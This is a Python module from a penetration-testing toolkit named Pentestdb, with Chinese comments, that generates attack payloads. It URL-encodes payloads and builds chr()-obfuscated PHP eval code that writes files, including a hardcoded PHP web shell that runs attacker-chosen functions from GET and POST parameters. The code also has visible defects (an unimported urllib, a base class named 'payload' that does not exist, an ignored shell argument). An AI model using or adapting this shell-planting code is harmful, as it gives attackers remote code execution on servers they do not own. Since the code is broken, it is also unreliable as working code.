#!/usr/bin/env python
#-*- coding:utf-8 -*-

'''
Pentestdb, a database for penetration test.
Copyright (c) 2014-2015 alpha1e0
=============================================================
Payload 模块
'''


from coder import Code



class Payload(object):
    '''
    常用Payload生成
    '''
    def __init__(self, payload=None):
        self.payload = payload


    def urlEncode(self):
        return urllib.quote(self.payload)


    def urlAllEncode(self):
        code = Code(self.payload)

        return code.encode("url-all")


    def unicodeEncode(self):
        pass


    def unicodeAllEncode(self):
        pass



class PHPCode(payload):
    @classmethod
    def genWriteFileCode(cls, path, content):
        code = "file_put_contents({0}, {1});".format(path,content)

        encodedCode = ".".join(["chr({0})".format(ord(x)) for x in code])
        encodedCode = "eval({0});".format(encodedCode)

        return encodedCode


    @classmethod
    def genWriteShellCode(cls, path, shell=None):
        shell = '<?php $f=strrev($_GET["f"]);$f($_POST["pass"]);?>'

        return cls.genWriteFileCode(path, shell)
